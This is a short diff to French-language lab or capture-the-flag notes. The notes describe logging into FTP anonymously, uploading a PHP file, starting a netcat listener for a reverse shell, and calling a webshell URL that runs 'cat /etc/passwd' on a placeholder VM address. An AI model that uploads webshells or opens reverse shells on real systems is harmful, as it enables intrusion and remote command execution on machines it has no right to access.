@@ -52,10 +52,14 @@ login: anonymous
 pwd: Entrée (le bouton)
 
 # téléverser le fichier
-```put webshell.php```
+```put nc.php```
 
 # éxécuter ceci dans un terminal
-nc -lvnp 4444
+- nc -lvnp 12000
+    - -l : Active le mode "listener".
+    - -v : Mode verbeux pour voir les connexions établies.
+    - -n : Ignore les DNS pour accélérer la connexion.
+    - -p 12000 : Spécifie le port d'écoute.
 
 # mettre ceci dans le navigateur:
 - http://ADRESSE_IP_VM/files/webshell.php?cmd=cat%20/etc/passwd
